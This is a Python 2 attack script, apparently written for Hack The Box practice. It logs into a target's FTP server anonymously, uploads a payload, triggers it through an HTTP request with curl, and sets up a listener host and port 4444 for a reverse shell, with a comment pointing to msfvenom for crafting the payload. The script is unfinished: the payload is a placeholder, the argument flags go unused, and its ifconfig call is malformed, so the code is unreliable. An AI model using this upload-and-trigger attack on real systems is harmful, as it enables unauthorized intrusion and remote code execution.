import ftplib, sys, time, subprocess, socket, argparse

class Netcat:
    """ Python 'netcat like' module """
    def __init__(self, ip, port):
        self.buff = ""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((ip, port))

    def read(self, length = 1024):
        """ Read 1024 bytes off the socket """
        return self.socket.recv(length)

    def read_until(self, data):
        """ Read data into the buffer until we have data """
        while not data in self.buff:
            self.buff += self.socket.recv(1024)
        pos = self.buff.find(data)
        rval = self.buff[:pos + len(data)]
        self.buff = self.buff[pos + len(data):]
        return rval

    def write(self, data):
        self.socket.send(data)

    def close(self):
        self.socket.close()


class attack(object):
    def __init__(self, rhost):
        self.rhost = rhost
        self.lhost = "1.2.3.4"
        # For HTB purpose:
        # try:
        #     ip = subprocess.Popen(["/sbin/ifconfig", "tun0", "|", "grep", "'inet addr:'", "|", "cut", "-d:", "-f2", "|", "awk", "'{ print $1}'"], stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        #     out, err = ip.communicate()
        #     self.lhost = out
        self.lport = 4444
        self.payload = 'test.txt' # craft msfvenom instead
        self.anonLogin(self.rhost)

    def anonLogin(self, rhost):
        try:
            ftp = ftplib.FTP(self.rhost)
            ftp.login('anonymous', 'derpiderp')
            print '\n[*] ' + str(self.rhost) +\
                ' FTP Anonymous Logon Succeeded.'
            self.uploadPayload(self.rhost)
        except Exception, e:
            print '\n[-] ' + str(self.rhost) +\
                ' FTP Anonymous Logon Failed.'
            return False

    def uploadPayload(self, rhost):
        try:
            ftp = ftplib.FTP(self.rhost)
            ftp.login('anonymous', 'derpiderp')
            up_file = open(str(self.payload), 'rb') # Change this to payload from self.payload
            ftp.storbinary('STOR payload.txt', up_file) # Change this to payload from self.payload
            up_file.close()
            #return up_file.name
            print '[+] Payload uploaded!'
            ftp.quit()
            self.activate(self.rhost, self.payload)
        except Exception, e:
            print '[!] Error uploading payload, it seems that there is no write permissions for anonymous, exiting..'
            sys.exit(0)

    def activate(self, rhost, payload):
        try:
            # TODO: Call Netcat with: Netcat('127.0.0.1', '4444') ?
            #       Followed by: nc.read_until('>')
            hostname = rhost + "/" + payload
            curl = subprocess.Popen(["curl", "-k", hostname], stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            print '[+] Triggered payload!'
        except Exception, e:
            print '[!] Error triggering payload at ' + str(hostname)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-e', '--execute', nargs=1, dest='execute', help='Execute command on a remote host')
    parser.add_argument('-c', '--cmd', dest='cmd', help='Run command shell. Use "q" or "exit" to break')
    parser.add_argument('-l', '--lhost', required=True, dest='lhost', help='Listen address for incoming connections')
    parser.add_argument('-p', '--lport', required=True, dest='lport', type=int, help='Listen port')
    args = parser.parse_args()

    attack(sys.argv[1])